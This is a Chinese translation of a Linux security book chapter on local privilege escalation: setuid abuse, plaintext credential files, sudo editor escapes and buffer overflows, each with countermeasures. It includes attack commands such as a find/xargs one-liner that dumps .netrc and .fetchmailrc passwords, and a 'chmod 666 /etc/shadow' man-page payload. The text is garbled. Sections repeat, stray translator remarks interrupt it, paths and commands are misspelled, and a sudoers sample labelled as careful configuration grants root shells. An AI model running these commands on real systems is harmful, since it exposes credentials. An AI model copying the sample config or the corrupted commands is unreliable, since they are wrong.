从本地账户开始，攻击者可能访问其他仅限本地的漏洞和漏洞。系统管理员集中在网络漏洞上，而忽略了本地漏洞。他们可能认为用户是值得信任的，或者可能只是工作过载，或者认为某些本地漏洞不值得投入精力或优先级。

在某些情况下，系统管理员可能会通过限制网络权限或在边界防火墙上阻止该服务来关闭远程漏洞。在不运行 LPR 服务的情况下很难支持打印机。虽然可以从外部网络攻击阻止对服务的访问，但一旦攻击者进入系统，他就可以通过环回接口在本地对 LPR 服务执行“网络”漏洞。使用 NFS 或运行其他 RPC 服务可能导致外部网络访问被阻止，但一旦攻击者进入系统，所有被阻止的漏洞都可以供他利用。这可能导致本地攻击者在进入边界防御后，有一类新的远程漏洞可利用。

## 揭秘 Linux 攻击：Linux 安全秘密与解决方案

某些记录漏洞和利用程序的服务会将某些利用标记为“远程：可利用：是”，同时误导性地将它们标记为“本地可利用：否”。这给了一个错误的印象，即如果服务被阻止了远程访问，本地用户就无法利用这些漏洞。事实上，这些漏洞中的许多可以通过本地或环回接口在本地被利用。

一旦进入本地系统，攻击者可能找到可写文件，这些文件可以提供从网络无法获得的增强权限，或者可读文件可以告诉他/她更多关于你的安全和防御的信息。

攻击者可能找到不当开启了 `setuserid` 位的程序；`setuserid` 程序的有效用户 ID 是拥有文件的用户，而不是运行程序的用户，如下所示：

```
root@machine cp `which id`
root@machine chown root ./id
root@machine chmod 755 ./id; chmod u+s /id
root@machine ls -l /id
-rws-xr-x 1 root root 9264 8 21:36 /id*
```

```
kristen@machine$ id
uid=500 (kristen) gid=500 (kristen)
kristen@machine$ /id
uid=500 (kristen) gid=500 uid=0 (root)
```



通过 `chmod g+s` 命令创建的 setgroup 程序，其运行时的有效组 ID（effective group ID）与调用者的 ID 不同。运行 setuserid 或 setgroup 的程序允许黑客尝试滥用程序运行时具有的增强权限。

两千年前，孙子在《兵法》中教导了“无形”的优缺点以及被困于“阵法”的风险。已经进入你系统的攻击者可以少地依赖已知的、预包的利用程序，从而使其行为更加完美无缺。与此同时，他对你的系统、你的阵法的了解增加了。随着攻击者寻求通过他现在能识别的任何手段将权限提升到 root，优势转向了攻击者这边。

### 受信任路径与特木马

攻击者包里的一种技巧是特木马。它用一个二进制文件替换另一个，以执行请求的操作，并顺带加入了一些额外的技巧。特木马程序是 rootkit 的一部分，程序实际上替换了系统二进制文件。它们也可以用于对未修改任何系统二进制文件而毫无防备的用户。Rootkit 和其他类似工具将在第 10 章讨论黑客如何维持访问权限时进行更广泛的介绍。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_281_0.png)

### 受信任路径与特木马

攻击者包里的一种技巧是特木马。它用一个二进制文件替换另一个，以执行请求的操作，并顺带加入了一些额外的技巧。特木马程序是 rootkit 的一部分，程序实际上替换了系统二进制文件。它们也可以用于对未修改任何系统二进制文件而毫无防备的用户。Rootkit 和其他类似工具将在10章讨论黑客如何维持访问权限时进行更广泛的介绍。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_281_0.png)

等待，让我重新检查一下流程。

攻击者包里的一种技巧是特木马。它用一个二进制文件替换另一个，以执行请求的操作，并顺带加入了一些额外的技巧。特木马程序是 rootkit 的一部分，程序实际上替换了系统二进制文件。它们也可以用于对未修改任何系统二进制文件而毫无防备的用户。Rootkit 和其他类似工具将在10章讨论黑客如何维持访问权限时进行更广泛的介绍。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_281_0.png)

### 受信任路径与特木马

攻击者包里的一种技巧是特木马。它用一个二进制文件替换另一个，以执行请求的操作，并顺带加入了一些额外的技巧。特木马程序是 rootkit 的一部分，程序实际上替换了系统二进制文件。它们也可以用于对未修改任何系统二进制文件而毫无防备的用户。Rootkit 和其他类似工具将在10章讨论黑客如何维持访问权限时进行更广泛的介绍。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_281_0.png)

等待，我看到文本重复或改变了。让我们提供从开始合并的版本。

# 第 8 章：提升用户权限

系统上的普通用户通常比系统用户和超级用户多（创建额外的 root 用户是一种不良做法，应予以抵制）。普通用户的登录更有可能通过不安全的通道在网络上发生。他们的密码也更容易被猜中、破解或滥用。未加密的会话还可能被劫持，使用户在无需破解其密码的情况下遭受攻击。

此外，更多的系统守护进程可能在它们自己的系统账户下运行，而不是超级用户账户。破解一个已正确配置为在自己的用户 ID 下运行、且二进制文件、控制和配置文件由不同 ID 拥有的系统服务，只能获得系统的有限访问。但这只是一个开始。

## 权限提升

黑客可能已经在受攻击的系统中拥有一个账户（无论合法与否）。从那里，他/她可以攻击其他账户（包括系统账户和用户账户），以获得其账户无权拥有的访问权限。这被称为*权限提升*。他们从攻击中获得的任何东西都会增加他们在系统中的权限能力。当然，最终目标是成为超级用户。

根据 FBI 的说法，大多数攻击是内部的。不要低估合法用户获得未授予权限的可能性。通过获取令牌（token），不要假设攻击者就是他表现出来的身份。你系统上的用户可能不像你的*root* 账户那样受到保护，他们本身可能已经被攻破。

一旦进入系统，攻击者就有许多更多方法尝试攻破 root。在远程，黑客关于系统可以利用的信息极少，必须依赖各种已知的漏洞和远程漏洞。一旦进入系统，他就可以访问更多关于系统及其防御的信息；他现在拥有了以前的所有内容，以及更多内容。他可以针对系统及其环境定制化攻击。攻击者有更广泛的攻击范围可供选择，而且更不可预测，更难防御。

从本地账户开始，攻击者可能访问其他仅限本地的漏洞和漏洞。系统管理员集中在网络漏洞上，而忽略了本地漏洞。他们可能认为用户是值得信任的，或者可能只是工作过载，或者认为某些本地漏洞不值得投入精力或优先级。

在某些情况下，系统管理员可能会通过限制网络权限或在边界防火墙上阻止该服务来关闭远程漏洞。在不运行 LPR 服务的情况下很难支持打印机。虽然可以从外部网络攻击阻止对服务的访问，但一旦攻击者进入系统，他就可以通过环回接口在本地对 LPR 服务执行“网络”漏洞。使用 NFS 或运行其他 RPC 服务可能导致外部网络访问被阻止，但一旦攻击者进入系统，所有被阻止的漏洞都可以供他利用。这可能导致本地攻击者在进入边界防御后，有一类新的远程漏洞可利用。

## 揭秘 Linux 攻击：Linux 安全秘密与解决方案

某些记录漏洞和利用程序的服务会将某些利用标记为“远程：可利用：是”，同时误导性地将它们标记为“本地可利用：否”。这给了一个错误的印象，即如果服务被阻止了远程访问，本地用户就无法利用这些漏洞。事实上，这些漏洞中的许多可以通过本地或环回接口在本地被利用。

一旦进入本地系统，攻击者可能找到可写文件，这些文件可以提供从网络无法获得的增强权限，或者可读文件可以告诉他/她更多关于你的安全和防御的信息。

攻击者可能找到不当开启了 setuserid 位的程序；setuserid 程序的有效用户 ID 是拥有文件的用户，而不是运行程序的用户，如下所示：

```
root@machine cp `which id`
root@machine chown root ./id
root@machine chmod 755 ./id; chmod u+s /id
root@machine ls -l /id
-rws-xr-x 1 root root 9264 8 21:36 /id*
```

```
kristen@machine$ id
uid=500 (kristen) gid=500 (kristen)
kristen@machine$ /id
uid=500 (kristen) gid=500 uid=0 (root)
```



通过 `chmod g+s` 命令创建的 setgroup 程序，其运行时的有效组 ID（effective group ID）与调用者的 ID 不同。运行 setuserid 或 setgroup 的程序允许黑客尝试滥用程序运行时具有的增强权限。

两千年前，孙子在《兵法》中教导了“无形”的优缺点以及被困于“阵法”的风险。已经进入你系统的攻击者可以少地依赖已知的、预包的利用程序，从而使其行为更加完美无缺。与此同时，他对你的系统、你的阵法的了解增加了。随着攻击者寻求通过他现在能识别的任何手段将权限提升到 root，优势转向了攻击者这边。

### 受信任路径与特木马

攻击者包里的一种技巧是特木马。它用一个二进制文件替换另一个，以执行请求的操作，并顺带加入了一些额外的技巧。特木马程序是 rootkit 的一部分，程序实际上替换了系统二进制文件。它们也可以用于对未修改任何系统二进制文件而毫无防备的用户。Rootkit 和其他类似工具将在第 10 章讨论黑客如何维持访问权限时进行更广泛的介绍。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_281_0.png)

# 第 8 章：提升用户权限

`setuserid` 功能应该限制在非常小的、不运行外部命令的应用程序或守护进程中。

系统管理员和非编程人员在移除这些应用程序，或将其替换为可以过滤 `PATH` 变量的前端脚本时，能做的事情有限。幸运的是，这类漏洞对于攻击者来说很难发现，而且相对稀少。通过减少系统上 `setuserid` 和 `setgroupid` 应用程序的数量，可以将风险降至最低。

## 密码的存储与使用

在 UNIX 及相关系统中，账户信息存储在 `/etc/passwd` 文件中。`/etc/passwd` 文件存储常用的用户账户信息，例如用户 ID 和组 ID、用户 shell 以及用户名。许多应用程序（如 `/bin/ls` 甚至 shell）都需要这些常用账户信息。因此，`/etc/passwd` 文件必须对所有用户 ID 下的所有进程可读。

`/etc/passwd` 文件以前还包含每个用户的加密密码。现在，这些加密密码被存储在 `/etc/shadow` 文件中，只有 root 用户可以读取。采取这一步骤是为了防止用户运行密码破解器（根据字典单词和其他常用密码规则尝试猜测密码的程序）对密码进行逆向工程。有关密码破解器的深入介绍，请参阅第 9 章。

虽然加密密码现在已无法被轻易查看，但获取了系统访问权的攻击者仍然可以利用其他密码漏洞。

## 用户文件中的密码

| 流行度: | 7 |
| 简单性: | 8 |
| 影响: | 6 |
| 风险评分: | 7 |

当明文密码或可逆哈希值存储在系统的文件和数据库中时，就会出现一个严重的问题。这个问题可能出现在用户文件和系统文件中。

从远程 POP 或 IMAP 服务器下载邮件的常用工具是 `Fetchmail`。用户可以单独运行 `Fetchmail` 手下载邮件，也可以以守护进程模式运行以定期下载用户邮件。以守护进程模式运行时，`Fetchmail` 会在其控制文件 `.fetchmailrc` 或 `.netrc` 中查找用户密码。这些密码以明文形式存储在这些文件中。虽然 `Fetchmail` 会拒绝使用全用户可读的配置文件，但仍然可能犯下错误，将密码存储在系统上其他任何人都可读的文件中。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_284_0.png)

# Linux 破解公开：Linux 安全秘密与解决方案

`.fetchmail` 文件仅供 `Fetchmail` 使用；然而，`.netrc` 文件被 `ftp`、`ncftp` 和 `curl` 等多个网络工具使用。大多数情况下，`.netrc` 包含访问匿名 FTP 站的默认信息。它还可能包含认证 FTP 的账户和密码。

搜索整个系统以找到所有 `.fetchmailrc` 和 `.netrc` 文件并检查哪些是可读的是非常简单的事——例如，可以使用此简单命令：

```
hacker@machine$ find / -name .fetchmailrc -o -name .netrc | xargs cat
```



尽管使用文件的程序在文件全用户可读时会拒绝使用，但它们通常会接受组用户可读的文件。任何 `.fetchmailrc` 或 `.netrc` 文件所属组的成员都能读取该文件中的密码。

### 消除用户文件中的密码

如果可能，永远不要在 `.fetchmailrc` 或 `.netrc` 文件中存储活动账户。如果需要此类存储，请确保这些文件仅所有者可读，而组或其他其他人不可读。

不要在 `.netrc` 中为 FTP 存储认证信息。存储匿名 FTP 的信息完全没问题，但在该文件中存储账户和密码是向攻击者发出探索的诱人邀请。

| 流行度 | 7 |
| 简单性 | 8 |
| 影响 | 7 |
| 风险评分 | 7 |

各种系统可能要求将密码存储在系统中。例如，Samba 包具有 Smbprint 功能，允许 Linux 用户打印到连接到 Windows 主机和工作站的打印机。通常，对这些打印机的访问由用户 ID 和密码控制，类似于普通用户账户。打印机访问甚至可以由普通用户账户控制。

要打印到连接 Windows 的打印机，Smbprint 程序可能需要该打印机的用户名和密码。该信息存储在打印机所在池目录下的一个控制文件中。在许多系统中，该控制文件对系统上的所有用户都是可见的。如果账户和密码在本地系统中被重复使用，用户名和密码的暴露可能会导致远程 Windows 系统和本地系统的同时破解。

# 第 8 章：提升用户权限

如果机器通过调制解调器拨号，该连接的用户名和密码通常也包含在一个文件中。例如，通用 PPP 可能会在 `/etc/ppp/chap-secrets` 文件中查找单词，而 Wwdial 则在 `/etc/wwdial.conf` 中查找。

## 系统密码文件

为了保护存储的 Smbprint 密码，请确保 `/var/pool/lp` 中的所有配置文件都不是全用户可读。搜索 `/var/pool/lp` 目录下的所有 `.config` 文件，并对每个文件执行 `chmod o-rw` 命令。文件通常由 root 组所有，因此可能不需要限制组的读取权限。

对于拨号访问密码（通常必须以 root 身份运行以建立正确的路由），使用 `chmod 600` 限制文件使其仅 root 可读。

可能还有其他以明文存储密码的程序，因此请适当检查权限。

### 可恢复的存储密码

| 流行度: | 5 |
| 简单性: | 4 |
| 影响: | 6 |
| 风险评分: | 5 |

某些需要存储密码的 Linux 程序不会以明文保存密码，而是以可逆的形式保存。有关密码破解器的深入介绍，请参阅第 9 章。

虽然加密密码现在已无法被轻易查看，但获取了系统访问权的攻击者仍然可以利用其他密码漏洞。

# Linux 破解公开：Linux 安全秘密与解决方案

Popauth 将所有用户密码以加密方式存储在数据库中。如果攻击者获取了 Popauth 数据库，系统上的所有用户密码都会立即破解。攻击者只需要运行修改后的 POP3 程序即可解密。可恢复密码的防御措施

如果可能，不要使用 Popauth。许多客户端支持 SSL 加密的 POP3。尽可能使用 SSL 加密为用户认证信息提供安全性。如果必须使用 Popauth，请确保 `/popauth` 文件仅 root 可读。

> 注意 明文或可逆形式存储在数据库中的密码问题适用于许多类型的数据库。应该检查数据库是否存在明文密码内容。可逆加密密码更难发现，除非数据库代码已知，否则不太可能是安全风险。

### 命令行中的密码

| 流行度 | 7 |
| 简单性 | 7 |
| 影响 | 7 |
| 风险评分 | 7 |

某些工具（如 `smount` 和 `smclient`，偶尔还有 `mount`）允许通过命令行或环境变量传递密码。这种方法从多个方面来看充满了危险。

当密码位于命令行时，通常可以通过 `ps` 显示或直接读取 `/proc` 条目检测到。允许在命令行使用密码的应用程序通常尝试覆盖命令行参数以隐藏密码，但这仅仅是将问题变成了一种竞赛：用户必须一直获胜才能保证安全，而攻击者只需胜一次即可破解账户。这不是一个值得下注的竞赛。攻击者需要创建一个脚本，定期对 `ps` 显示拍摄快照，然后该脚本记录任何在命令行中发现带有密码的命令。

### 消除命令行密码

不惜代价避免在命令行中使用密码！寻找其他更好的方法来完成工作，无论是使用不同的命令或访问方法，还是通过更安全的通道将密码传递给应用程序（例如通过命名管道、套接字或简单的标准输入上的正常提示）。

## 历史文件搜寻攻击

| 流行度 | 7 |
| 简单性 | 7 |
| 影响 | 5 |
| 风险等级 | 6 |

使用命令行密码或其他敏感命令行输入时，另一个经常被忽视的风险：你输入的任何命令都会保存在 shell 历史文件中。应用程序可能会在内存中覆盖密码，但它无法知道该密码现在可能被记录在如 `.bash_history` 等文件中。默认情况下，该文件对所有者是可读可写的；然而，所有者应该意识到密码可能潜伏在这些文件之中。

当通过环境变量传递密码时，请记住设置环境变量的交互式命令也会存储在历史文件中。另一种方法是在脚本中设置环境变量，然后执行程序，这种方法可能更糟，因为它会将密码存储在可能允许组用户或世界（world）可读的文件中。攻击者通常会浏览可读的历史文件，并扫描这些文件以寻找密码或其他安全相关的信息。

### 历史文件搜寻应对措施

确保所有历史文件仅对所有者可读。定期清理历史文件，以防止命令和安全活动信息的长期积累。如果你计划运行你不希望记录的命令，可以通过取消设置 `HISTFILE` 环境变量并启动新的 shell 来关闭历史记录。然而，最好的方法是不将密码包含在命令行参数中。

## 组组成关系

如果攻击者和受攻击的用户共享同一个主组（primary group），攻击和访问另一个用户的配置文件（以及可能的密码信息）将变得简单易得多。通常情况下，诸如 `.bashrc` 或 `.hosts` 等配置文件允许访问它们的应用程序进行组可读。用户通常不知道所有人是否都共享他们的主组，也不知道其他人为了防止攻击采取了哪些安全预防措施。攻破主组中的某一个账户会导致同组的其他账户面临更高的脆弱性。

### 可写入的组权限

| 流行度 | 5 |
| 简单性 | 7 |
| 影响 | 5 |
| 风险等级 | 6 |

攻击者可以轻松扫描密码文件，寻找共享相同组 ID（group ID）的其他用户。然后，攻击者可以在这些用户账户中搜索可读且可能包含密码或其他安全信息的文件。

攻击者还可以定位可写且可执行的文件，以防止木马程序。例如，许多用户会创建自己的目录，传统上是 `HOME/bin`。如果其中的任何程序对该组可写，那么该组内的攻击者就可以欺骗用户执行任意命令。

### 组组成应对措施

每个用户都应该有一个唯一的主组，该用户是该组的唯一成员。除非采取步骤更改组所有权，否则所有用户创建的文件组组组。共享文件访问应通过使用辅助组（secondary group）成员来处理。

默认的 `umask` 可以设置为严格的安全值，以防止创建文件时产生默认的组读写权限。将 `umask` 值设置为 `066` 意味着创建的文件默认权限仅为所有者可读可写，而组或任何其他人都没有读或写权限。

> 如果要极度偏执，请使用 `077` 的 `umask`。这应该是 root 以及任何拥有 root 权限用户的默认 `umask`。

## 特殊用途组与设备访问

某些辅助组用于协调对 `tty`、磁盘和软盘等系统资源的访问。其他特殊组可能是二进制文件、文件或设备所有权的占位符。

加入 `tty` 组赋予了对系统串口设备的某些权利。这是通过 `/dev/tty*` 设备本身的组所有权和权限来实现的。

通过更改用户的所有权或权限来授予用户设备访问权限是很有诱惑力的，但正确的方法是将特定用户添加到适当的辅助组中。

## 特殊用途组攻击

| 流行度 | 6 |
| --- | --- |
| 简单性 | 7 |
| 影响 | 6 |
| 风险等级 | 6 |

攻击者检查 `/dev` 中的设备是否存在松散的权限。这可能让攻击者获得内存、磁盘或串口设备的访问权限，并导致系统和敏感文件的进一步泄露。

例如，`/dev/kmem` 允许访问内核内存。能够读取此文件的攻击者可能能够读取系统当前正在使用的任何数据。当用户登录时，必须读取 `/etc/shadow` 文件的部分内容以提供身份验证，这些数据在从磁盘读取时会通过内核内存。能够读取内核内存的攻击者可以利用它在用户登录时读取 `/etc/shadow` 条目，并尝试破解检索到的任何加密密码。

如果如 `/dev/sda1` 等磁盘分区是可读的，她将能够访问原始磁盘数据。通过使用 `/sbin/dump`，她可以获得允许运行的该分区上所有文件的副本。这将绕过任何文件权限，因此所有文件（包括如 `/etc/shadow` 等敏感文件）在未获得 root 权限的情况下从磁盘上被读取。

### 特殊用途组应对措施

通过适当使用辅助组向用户授予访问权限，而不是通过放权限。这种方法的缺点是，用户在创建新的辅助组之前必须注销并重新登录。了解你所做的的任何更改的安全影响。

如果用户需要访问通常只有 root 可访问的特定设备或文件，请考虑使用 `Sudo` 允许用户以 root 权限运行特定程序。注意，你必须在配置 `Sudo` 时非常小心，以避免允许用户获取 root 权限。

> 像 Linux 入侵检测系统 (LIDS) 等高级安全系统对访问提供了更细粒度的控制，并更好地防止滥用。它们也需要更多的管理工作。

## 轮组 (Wheel Group)

某些系统上的一个特殊用途组是轮组（wheel group）。在启用轮组的系统中，只有轮组成成员被允许运行 `su` 变为 root。

# Linux 黑客攻击揭秘：Linux 安全与解决方案

即使 root 密码被破解，不是轮组成的用户无法通过 `su` 变为 root。将这种限制结合使用 `/etc/secure` 文件保护 root，可以为 root 提供增强的安全。

轮组的缺点是，它可以作为攻击者判断哪些账户更有价值的指标。`/etc/group` 文件全局可读，判断是否存在轮组以及成员是谁是一件易事。

大多数 Linux 发行版不会自动启用轮组访问控制，即使是那些预定义了该组的发行版。支持 PAM 的发行版中，对轮组的支持通过在适当的 PAM 控制文件中添加 `pam_wheel` 行来实现，特别是 `/etc/pam.d/su`。

### Sudo 密码更改应对措施

创建一个前端脚本，检查要更改的用户名，并确认其有效且不是系统账户。系统账户的用户 ID（UID）通常小于一个预设值，根据系统不同，该值通常为 200 或 500。尝试更改用户 ID 小于规定最小值的任何账户的密码都应该导致错误。

根据系统策略，脚本还应该检查确保被更改的用户未被锁定，并且具有有效的 shell。

只有当用户名通过了前端脚本施加的所有测试时，才允许使用指定的用户名执行 `passwd` 命令。

### Sudo 编辑器交互

| 流行度: | 5 |
| --- | --- |
| 简单性: | 7 |
| 影响: | 9 |
| 风险评级: | 7 |

用户通常被授予某个配置程序的访问权限，该程序包含运行编辑器的功能，例如 `cronab -e user`。此类程序大多数大多数允许通过 `VISUAL` 或 `EDITOR` 环境变量指定默认编辑器，几乎任何程序都可以运行。

编辑器应该被限制在常用的编辑器中，如 `vi`、`ed` 或 `emacs`。然而，大多数编辑器也具有运行外部命令或逃逸到 shell 的。由于编辑器是以 root 身份运行的，通过编辑器从 shell 运行命令即可以 root 身份运行任何程序。

即使编辑器在某种程度上受到限制以防止运行外部命令或退出，它仍然可以读取在这些情况下不应被读取的文件。以 root 运行编辑器意味着编辑器可以读取如 `/etc/shadow` 等文件，这些文件本应只允许 root 读取，而不是执行管理任务的普通用户读取。

更糟糕的是，大多数编辑器允许你随时打开新文件。如果一个 `sudo` 命令允许黑客编辑 `/etc/hosts`，那么没有理由黑客不能写入任何 `/etc/hosts` 的更改，然后打开 `/etc/shadow` 进行写入。快速更改 root 的加密口令将允许黑客轻松地登录或运行 `su` 变成 root。

### Sudo 编辑器应对措施

编辑器问题的最佳解决方案取决于应用程序。在需要编辑文件的情况下，应该锁定文件并将其复制到安全位置，让权限最小的普通用户对其进行编辑。用户随后可以编辑临时文件，而不会面临其他受限系统文件被破坏的风险。编辑完成后，可以检查该文件以确保没有受限字段被更改，并且所做的更改与文件结构和系统要求一致。修改后的文件可以复制回原始文件并删除。

这里有一个示例脚本，你可以允许用户通过 `sudo` 安全地编辑 `/etc/passwd` 文件：

```sh
```



#!/bin/sh

### sudo-vipw... 编辑密码文件

### 创建一个用于临时文件的目录

### 因为我们只允许同时有一个实例编辑文件，

# 我们使用一个公共目录作为锁定

# 机制。如果失败，超级用户可能需要手动恢复

# 锁

```
if ! mkdir /tmp/vipw.lock; then
    echo "Password file is locked. Try back later"
    exit 255
fi
```

```sh
### 将密码文件复制到临时文件，供用户 "nobody" 编辑 way。
### 它必须由 nobody 拥有并可写。

cp /etc/passwd /tmp/vipw.lock/passwd
chown nobody /tmp/vipw.lock/passwd
```

```sh
### 将密码文件复制到不可写的文件中供稍后比较
cp /etc/passwd /tmp/vipw.lock/passwd.orig

### 如果尚未指定编辑器，则设置默认编辑器
: EDITOR:=/bin/vi

### 现在让用户以用户 "nobody" 编辑文件
su nobody -c "$EDITOR /tmp/vipw.lock/passwd"
```

```sh
### 现在用户编辑已完成
### 1. 检查是否进行了修改？
### 比较 /tmp/vipw.lock/passwd 和 /tmp/vipw.lock/passwd
# 如果没有更改则退出。
### 2. 检查没有系统账户被修改。
### 3. 检查没有添加系统账户。
### 4. 检查没有删除系统账户。
### 5. 执行格式检查以确保文件可用。
### 6. 检查是否对原始文件进行了修改。
# 比较 /etc/passwd 和 /tmp/vipw.lock/passwd.orig
# 如果存在更改则带带错误退出。
### 最后，安装新的密码文件。
cat /tmp/vipw.lock/passwd > /etc/passwd
```

在这个示例中，编辑器是以用户 `nobody` 启动的。如果用户从编辑器退出到 shell，那么该 shell 在系统中应具有最小的权限。编辑后应始终对修改进行检查，以防止文件损坏和损坏。检查应该足够详尽，以确保符合本地的安全策略。

在极端情况下，你可以将编辑的文件复制到安全用户 ID 下的安全位置，然后在 `chroot`（更改文件系统）环境中针对要修改的文件执行编辑器。这样用户通过你采取的措施被双重锁定在系统的其他部分之外。

### 通过 Sudo 使用的其他漏洞程序

| 流行度: | 5 |
| --- | --- |
| 简单性: | 7 |
| 影响: | 9 |
| 风险评级: | 7 |

用户通常被授予某个包含运行编辑器功能的配置程序的访问权限，例如 `cronab -e user`。此类程序大多数允许通过 `VISUAL` 或 `EDITOR` 环境变量指定默认编辑器，几乎任何程序都可以运行。编辑器应该被限制在常用的编辑器中，如 `vi`、`ed` 或 `emacs`。然而，大多数编辑器也具有运行外部命令或逃逸到 shell 的。由于编辑器是以 root 身份运行的，通过编辑器从 shell 运行命令即可以 root 身份运行任何程序。

即使编辑器在某种程度上受到限制以防止运行外部命令或退出，它仍然可以读取在这些情况下不应被读取的文件。以 root 运行编辑器意味着编辑器可以读取如 `/etc/shadow` 等文件，这些文件本应只允许 root 读取，而不是执行管理任务的普通用户读取。

更糟糕的是，大多数编辑器允许你随时打开新文件。如果一个 `sudo` 命令允许黑客编辑 `/etc/hosts`，那么没有理由黑客不能写入任何 `/etc/hosts` 的更改，然后打开 `/etc/shadow` 进行写入。快速更改 root 的加密口令将允许黑客轻松地登录或运行 `su` 变成 root。

### 谨慎配置 Sudo

在创建 `sudoers` 文件时，要极其详细说明允许哪些程序。以下示例显示了如何配置漏洞程序：

```sudoers
user1 ALL=(root) /usr/bin/vi *
user2 ALL=(root) /usr/bin/less
user3 ALL=(root) /usr/bin/more /usr/bin/less *
user4 ALL=(root) /usr/bin/find -exec *
user5 ALL=(root) /usr/bin/python *
user6 ALL=(root) /usr/bin/perl *
user7 ALL=(root) /usr/bin/ruby *
user8 ALL=(root) /usr/bin/bash *
user9 ALL=(root) /usr/bin/sh *
user10 ALL=(root) /usr/bin/zsh *
user11 ALL=(root) /usr/bin/awk *
user12 ALL=(root) /usr/bin/awk *
user13 ALL=(root) /usr/bin/sed *
user14 ALL=(root) /usr/bin/grep *
user15 ALL=(root) /usr/bin/grep *
user16 ALL=(root) /usr/bin/cat *
user17 ALL=(root) /usr/bin/tail *
user18 ALL=(root) /usr/bin/head *
user19 ALL=(root) /usr/bin/more *
user20 ALL=(root) /usr/bin/less *
```

`HTTPD_RESTED` 中的用户可以带任何参数运行 `apachectl`。通过显式列出参数，你可以防止对可能被滥用的程序的访问。以下示例显示了如何：

```sudoers
HTTPD_RESTED ALL=(root) /usr/bin/apachectl start
HTTPD_RESTED ALL=(root) /usr/bin/apachectl stop
HTTPD_RESTED ALL=(root) /usr/bin/apachectl restart
HTTPD_RESTED ALL=(root) /usr/bin/apachectl status
```

`HTTPD_RESTED` 中的用户可以带任何参数运行 `apachectl`。通过显式列出参数，你可以防止对可能被滥用的程序的访问。以下示例显示了如何：

```sudoers
HTTPD_RESTED ALL=(root) /usr/bin/apachectl start
HTTPD_RESTED ALL=(root) /usr/bin/apachectl stop
HTTPD_RESTED ALL=(root) /usr/bin/apachectl restart
HTTPD_RESTED ALL=(root) /usr/bin/apachectl status
```



### SETUSER 程序

`setuserid` 和 `setgroupid` 程序是问题的持续源源。如果编写得不仔细，它们的溢出或命令执行将迅速导致用户标识更改和相应的权限更改。有时这会导致 root 被立即攻破；有时会向该方向更进一步。

幸运的是，与许多其他 UNIX 版本不同，Linux 不支持 `setuserid` shell 脚本。没有任何办法关闭创建 `setuserid` shell 脚本的所有可能漏洞。在 Linux 上，`setuserid` 或 `setgroupid` 程序必须是编译后的二进制文件。Perl 提供了一个特殊的解释器 `suidperl` 来处理 `setuserid` 脚本。遗憾的是，这增加了恶意 `setuserid` 程序的安全应对措施难度。

### 缓冲区溢出攻击

| 流行度: | 6 |
| --- | --- |
| 简单性: | 4 |
| 影响: | 7 |
| 风险评级: | 6 |

缓冲区溢出是程序处理内存方式粗放导致的安全漏洞。通过触发程序将机器码加载到内存中并覆盖函数的返回指针，黑客可以欺骗程序执行任意代码。最常见的是，代码将运行 `/bin/sh` 的副本，或者在 `.tmp` 中创建一个 `setuserid` root 权限的 `/bin/sh`。

> 欲了解有关缓冲区溢出的更详细描述，请参见第 6 章。关于如何滥用缓冲区溢出的极佳描述请参见 Aleph One 的文章《Smashing the Stack for Fun and Profit》，出自 Phrack 49，地址为 http://www.securityfocus.com/data/P49-14.txt。

`setuserid` 程序中的缓冲区溢出可能是灾难性的。由于程序运行的权限与调用用户不同，黑客可以利用缓冲区溢出来

# Linux 破解揭秘：Linux 安全秘密与解决方案

获取这些权限。在 `setuserid root` 程序的情况下，这意味着黑客可以获得一个即时的 root 提示符，从那里他可以进行任何他想做的破坏。

即使在非 root 用户下运行 `setuserid` 或 `setgroup` 程序的情况下，也可以直接利用溢出漏洞。例如，假设 `/usr/bin/cu` 程序存在缓冲区溢出漏洞。`cu` 具有以下权限：

```
machine# ls -l /usr/bin/cu

-r-sr-sr-x 1 uuc uucp 129724 7 2000 /usr/bin/cu*
```

如果 `cu` 发生缓冲区溢出，黑客就可以获得 `uuc` 用户和组权限。这被用于与其它系统建立连接，而且 `/etc/uuc` 区域通常硬编码了只有 `uuc` 可读取的密码。现在，攻击者可以获取这些密码了。

更糟糕的是，由于该程序由 `uucp` 所有，攻击者可以使用木马版本覆盖该程序并移除 `setuserid` 位。当 root 运行 `cu` 时，它将以 root 身份运行，攻击者就可以破坏 root 账户。

另一个例子是 `man` 程序，它通常被设置为 `setgroupid` 以允许保存首选 man 手页。如果任何 man 手页对 `man` 组可写（这很常见），且 `man` 程序被攻破（这发生过多次），那么攻击者就可以重写 man 手页。

这看起来似乎微不足道。然而，`man` 手页使用的宏语言比你想象的要强大得多。其中许多语言具有调用外部程序的能力。攻击者只需要修改一个 man 手页，使其执行 `chmod 666 /etc/shadow`，然后等待 root 读取该 man 手页即可。

## 缓冲区溢出防御措施

避免被你的 `setuserid` 或 `setgroup` 程序入侵的最重要的一步是保持它们最新更新。订阅安全邮件列表，特别是针对你使用的 Linux 发行版的列表。当发现漏洞时，做好升级软件包的准备。

对于你必须保留的这些 `setuserid` 和 `setgroup` 程序，你可以通过 `chattr +1` 命令将其设置为不可变，从而防止攻击者覆盖程序（尽管它本是有漏洞的）。要更改此类文件，必须先移除不可变属性，然后更改文件。每个 root 都可以移除不可变属性。你可能希望将包含程序的文件系统挂载为只读，以便无法对其进行任何更改。你可以使用只读介质（如 CD-ROM），或使用 `ro` 挂载点挂载普通磁盘。

`setuserid` 程序应限制在严格控制、定义良好的系统区域，以便在这些区域进行有效的管理和检查。这些定义良好的路径之外的 `setuserid` 程序应被禁止。检测未经授权的 `setuserid`

# 第 8 章：提升用户权限

程序可能导致对非常敏感的问题需要非常详细的回答。请参阅第 2 章获取可以运行的检测未经授权 `setuserid` 程序的脚本。

可以通过使用 `StackGuard` 编译器编译程序来防止缓冲区溢出，该编译器可以从 http://www.immunix.org 获取。该编译器在栈区域上放置其他值（称为“金丝雀”，canaries），这些值会被缓冲区溢出攻击覆盖。如果尝试攻击，金丝雀将失效，程序会立即终止，而不是运行攻击者的代码。

如果你编译自己的程序，请使用 `StackGuard` 编译器。你可能还想看看 Immunix，这是一个完全使用 `StackGuard` 编译器编译的 Red Hat 发行版。

此外，Solar Designer 在 http://www.openwall.org/ 维护着 Linux 内核补丁，使栈区域变为不可执行，从而防止将可执行代码放在栈上的缓冲区溢出。

## 格式字符串攻击

| 流行度 | 5 |
| 简单性 | 3 |
